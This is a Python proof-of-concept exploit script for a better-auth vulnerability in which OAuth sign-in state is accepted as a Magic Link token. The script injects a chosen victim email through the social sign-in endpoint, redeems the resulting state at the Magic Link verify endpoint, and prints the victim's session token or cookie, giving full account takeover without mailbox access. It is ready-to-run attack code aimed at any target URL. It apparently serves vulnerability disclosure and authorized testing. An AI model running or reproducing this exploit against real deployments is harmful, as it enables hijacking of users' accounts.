#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SPDX-License-Identifier: MIT
"""
better-auth GHSA-965c-763c-88jm proof of concept
================================================

OAuth sign-in state is accepted as a Magic Link token.

Affected: better-auth >= 1.4.0-beta.18, < 1.7.7, with Magic Link
(storeToken defaults to plain) and any social / Generic OAuth provider,
OAuth state stored in the database (the default when a DB is configured).

Mechanism:
  POST /api/auth/sign-in/social spreads additionalData onto the OAuth
  state JSON. GET /api/auth/magic-link/verify looks up verification by
  identifier (= state) with no purpose check, then signs in as the
  injected email.

Usage:
  python3 betterauth_poc.py -t http://target:8080 -e victim@example.com -p github
  python3 betterauth_poc.py -t https://target --cookie
  python3 betterauth_poc.py -t http://target --base-path /auth -e a@b.c

Python 3 standard library only. Authorized testing and education only.
"""

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request


def build_opener(insecure, no_redirect=False):
    handlers = []
    ctx = None
    if insecure:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
    if no_redirect:

        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, headers, newurl):
                return None

        handlers.append(NoRedirect())
    return urllib.request.build_opener(*handlers)


def http_json(opener, method, url, payload=None, headers=None, timeout=15):
    """Send a request. Returns (status, parsed-or-raw-body, headers)."""
    data = None
    hdrs = {"User-Agent": "betterauth-poc/1.0"}
    if headers:
        hdrs.update(headers)
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        hdrs.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = opener.open(req, timeout=timeout)
        raw = resp.read().decode("utf-8", "replace")
        return resp.status, parse_body(raw), dict(resp.headers)
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        return e.code, parse_body(raw), dict(e.headers)


def parse_body(raw):
    try:
        return json.loads(raw)
    except (ValueError, TypeError):
        return raw


def main():
    ap = argparse.ArgumentParser(
        description="better-auth GHSA-965c-763c-88jm PoC (OAuth state as Magic Link token)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("-t", "--target", required=True,
                    help="Target origin, e.g. http://10.0.0.1:8080 or https://sso.example.com")
    ap.add_argument("-e", "--email", default="victim@example.com",
                    help="Victim account email to take over")
    ap.add_argument("-p", "--provider", default="github",
                    help="Enabled OAuth provider id (github/google, or a generic-oauth providerId)")
    ap.add_argument("--base-path", default="/api/auth",
                    help="better-auth API base path")
    ap.add_argument("--name", default="poc",
                    help="Placeholder name in additionalData")
    ap.add_argument("--cookie", action="store_true",
                    help="Cookie mode: capture Set-Cookie from the 302. Default is JSON session credentials")
    ap.add_argument("--callback", default="/app",
                    help="Redirect target in cookie mode")
    ap.add_argument("-k", "--insecure", action="store_true",
                    help="Skip TLS certificate verification")
    ap.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds")
    args = ap.parse_args()

    base = args.target.rstrip("/")
    origin = base
    api = base + args.base_path.rstrip("/")

    print(f"[*] Target         : {base}")
    print(f"[*] API base path  : {args.base_path}")
    print(f"[*] Victim email   : {args.email}")
    print(f"[*] OAuth provider : {args.provider}")

    print("\n[1] POST {}/sign-in/social (inject victim email via additionalData)".format(args.base_path))
    status, body, _ = http_json(
        build_opener(args.insecure),
        "POST",
        api + "/sign-in/social",
        payload={
            "provider": args.provider,
            "callbackURL": "/",
            "disableRedirect": True,
            "additionalData": {"email": args.email, "name": args.name},
        },
        headers={"Origin": origin},
        timeout=args.timeout,
    )
    if status != 200 or not isinstance(body, dict) or "url" not in body:
        print(f"[-] Failed (HTTP {status}): {str(body)[:300]}")
        if status == 429:
            print("    Rate limited; wait tens of seconds and retry")
        else:
            print("    Check: provider exists (PROVIDER_NOT_FOUND), target is better-auth, "
                  "base-path is correct")
        return 2

    authorize_url = body["url"]
    state = urllib.parse.parse_qs(urllib.parse.urlparse(authorize_url).query).get("state", [None])[0]
    if not state:
        print(f"[-] No state in authorize url: {authorize_url[:200]}")
        return 2
    print(f"[+] state          : {state}")
    print("    (no IdP login required; state is stored before the redirect)")

    if args.cookie:
        print("\n[2] GET {}/magic-link/verify?token=<state> (cookie mode)".format(args.base_path))
        verify_url = api + "/magic-link/verify?" + urllib.parse.urlencode(
            {"token": state, "callbackURL": args.callback}
        )
        status, body, headers = http_json(
            build_opener(args.insecure, no_redirect=True),
            "GET",
            verify_url,
            headers={"Origin": origin},
            timeout=args.timeout,
        )
        cookies = headers.get("Set-Cookie", "") or headers.get("set-cookie", "")
        if "better-auth.session_token=" not in cookies:
            print(f"[-] No session cookie (HTTP {status}): {str(body)[:300]}")
            return 2
        token = cookies.split("better-auth.session_token=", 1)[1].split(";", 1)[0]
        print("[+] Takeover succeeded. Session cookie (paste into the browser):")
        print(f"\n    better-auth.session_token={token}\n")
        return 0

    print("\n[2] GET {}/magic-link/verify?token=<state> (JSON mode)".format(args.base_path))
    verify_url = api + "/magic-link/verify?" + urllib.parse.urlencode({"token": state})
    status, body, _ = http_json(
        build_opener(args.insecure),
        "GET",
        verify_url,
        headers={"Origin": origin},
        timeout=args.timeout,
    )
    if status != 200 or not isinstance(body, dict) or "token" not in body:
        print(f"[-] Verify failed (HTTP {status}): {str(body)[:300]}")
        print("    Check: Magic Link enabled, state not expired (10 min) or already consumed")
        return 2

    user = body.get("user") or {}
    got_email = user.get("email", "?")
    print(f"[+] Session issued for: {got_email} ({user.get('name', '')})")
    print(f"[+] Session token     : {body['token']}")
    print(f"[+] Session expires   : {body.get('session', {}).get('expiresAt', '?')}")

    if got_email.lower() == args.email.lower():
        print(f"\n[+] Reproduced: full session for {args.email} without mailbox access.")
        return 0
    print("\n[!] Session issued, but email does not match the target. Inspect the output.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
